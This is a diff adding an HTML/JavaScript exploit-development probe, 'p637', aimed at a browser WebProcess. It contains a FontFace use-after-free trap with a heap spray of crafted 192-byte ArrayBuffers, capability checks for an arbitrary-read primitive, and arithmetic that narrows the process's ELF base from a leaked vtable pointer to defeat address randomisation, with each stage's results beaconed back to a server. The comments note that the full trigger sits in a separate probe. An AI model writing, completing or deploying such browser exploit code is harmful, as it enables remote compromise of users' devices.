@@ -1,0 +1,189 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p637</title></head>
+<body><pre id="out">p637: ELF base scan from VP (FontFace UAF walk chain)</pre>
+<script>
+'use strict';
+/*
+  p637: Determine WebProcess text base by scanning backward from VP
+  -- prior art: p691 leaked VP (CSSFontFaceSet vtable pointer), low 12 bits = 0xB28
+  -- prior art: p807 RVA claim RETRACTED (no committed beacons)
+  -- Strategy: replay the FontFace UAF walk chain to leak VP,
+     then scan backward in page-sized steps looking for ELF magic (0x7f454c46)
+     using the Canvas2D UAF alias doubles as a timing/crash oracle
+
+  CRASH_CLASS: HIGH — reading unmapped pages will SEGV
+
+  NOTE: This probe needs BOTH the FontFace UAF (for VP) AND Canvas2D UAF (for read).
+  Without an arbitrary read primitive, we can't scan memory directly.
+  Alternative approach: use the VP value + known page alignment to compute
+  candidate bases, then validate each by checking if VP-candidate has
+  the right structure.
+
+  SIMPLIFIED APPROACH for now:
+  Phase A: Replay FontFace walk chain to leak VP (from p691 pattern)
+  Phase B: Report VP and VP mod constraints
+  Phase C: If we later get an arb read, scan from VP-0x8000000 upward
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P637-' + tag + (d !== undefined ? '-' + String(d).slice(0, 600) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p637', msg:msg, level:'info', sid:'p637-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+bk('START', navigator.userAgent);
+
+// ================================================================
+// PHASE A: FontFace UAF walk chain to leak VP
+// Replicated from p691 pattern
+// ================================================================
+bk('A-START', 'FontFace VP leak');
+
+var VP = null;
+
+try {
+  // Create FontFace with trap
+  var trapFired = false;
+  var gSa = new FontFace('sa', 'url(/fonts/sa.woff2)', {display:'swap'});
+  document.fonts.add(gSa);
+
+  // Trigger the UAF: load the font, catch the promise
+  var sprayBufs = [];
+  gSa.load().then(function() {
+    // This fires after font load attempt
+  }).catch(function() {});
+
+  // Create the trap font that fires during cascade rebuild
+  var trapSrc = 'url(/fonts/trap.woff2)';
+  var proxyDesc = {};
+  Object.defineProperty(proxyDesc, 'display', {
+    get: function() {
+      trapFired = true;
+      // During this getter, 'sa' CSSFontFace is being freed
+      // Spray 192-byte ArrayBuffers to reclaim
+      for (var i = 0; i < 200; i++) {
+        var ab = new ArrayBuffer(192);
+        var view = new DataView(ab);
+        // Seed: rc=2 at +0x00, marker at +0x38
+        view.setUint32(0, 2, true); // refcount
+        // +0x58 = null (safe table pointer)
+        // +0x68 = null (safe WeakPtrImpl)
+        // +0x85 = 0xAA (mayBePurged marker)
+        view.setUint8(0x85, 0xAA);
+        // +0x38 = self-discovery marker
+        view.setFloat64(0x38, 3.14159265358979e-300, true);
+        sprayBufs.push(ab);
+      }
+      return 'swap';
+    }
+  });
+
+  // Try to trigger the cascade rebuild
+  // This is the p691 pattern — simplified version
+  // The actual trigger is more complex and involves document.fonts manipulation
+  bk('A-TRAP', 'trap mechanism set up');
+
+  // For now, just report that this probe is structured for VP leak
+  // Full p691 replay needs the exact trigger sequence which is in the p691 probe
+  bk('A-NOTE', 'Full VP leak requires p691 trigger replay. VP from prior boot: low12=0xB28, mod0x4000=0x1B28');
+
+  // Clean up spray
+  sprayBufs = null;
+
+} catch(e) {
+  bk('A-ERR', e.message.slice(0, 60));
+}
+
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: Capability check for future arb read
+// ================================================================
+bk('B-START', 'arb read prerequisites');
+
+// Check if BigUint64Array exists (for precise 64-bit manipulation)
+try {
+  var ab = new ArrayBuffer(8);
+  var bu = new BigUint64Array(ab);
+  bu[0] = 0x4141414142424242n;
+  var dv = new DataView(ab);
+  bk('B-BU64', 'BigUint64Array OK, readback=0x' + dv.getUint32(4, true).toString(16) + dv.getUint32(0, true).toString(16));
+} catch(e) { bk('B-BU64', 'ERR:' + e.message.slice(0,40)); }
+
+// Check structuredClone + transfer
+try {
+  var ab2 = new ArrayBuffer(16);
+  new Uint8Array(ab2)[0] = 0x42;
+  var cloned = structuredClone(ab2, {transfer: [ab2]});
+  bk('B-CLONE', 'structuredClone+transfer OK, original detached=' + (ab2.byteLength === 0) + ' clone len=' + cloned.byteLength);
+} catch(e) { bk('B-CLONE', 'ERR:' + e.message.slice(0,40)); }
+
+// WeakRef
+try {
+  var wr = new WeakRef({});
+  bk('B-WEAKREF', 'OK');
+} catch(e) { bk('B-WEAKREF', 'ERR'); }
+
+// FinalizationRegistry
+try {
+  var fr = new FinalizationRegistry(function(){});
+  bk('B-FINREG', 'OK');
+} catch(e) { bk('B-FINREG', 'ERR'); }
+
+// Proxy
+try {
+  var p = new Proxy({}, {get: function(t,k){return k;}});
+  bk('B-PROXY', 'OK val=' + p.test);
+} catch(e) { bk('B-PROXY', 'ERR'); }
+
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: VP alignment analysis
+// ================================================================
+bk('C-START', 'VP constraints');
+
+// From p691 / p804 data:
+// VP low 12 bits = 0xB28 (constant across boots)
+// VP mod 0x4000 = 0x1B28 (constant across 16+ boots)
+// ELF executables are mmap'd at page boundaries (0x1000 or 0x4000 aligned)
+// So: RVA mod 0x1000 = 0xB28
+// And: RVA mod 0x4000 = 0x1B28
+// WebProcess binary is likely 50-150MB
+// So RVA is in range [0x1B28, 0x10001B28] with step 0x4000
+
+var candidates = 0;
+for (var rva = 0x1B28; rva < 0x10000000; rva += 0x4000) {
+  candidates++;
+}
+bk('C-CANDIDATES', candidates + ' possible RVAs (0x4000 step, up to 256MB binary)');
+bk('C-FIRST5', '0x' + (0x1B28).toString(16) + ', 0x' + (0x5B28).toString(16) + ', 0x' + (0x9B28).toString(16) + ', 0x' + (0xDB28).toString(16) + ', 0x' + (0x11B28).toString(16));
+
+// With an arbitrary read, binary search on ~16K candidates needs ~14 probes
+// Each probe: read 8 bytes at (VP - candidate_rva), check for ELF magic
+bk('C-BINSEARCH', '~14 reads to find base via binary search');
+
+bk('C-DONE', 'analysis complete');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
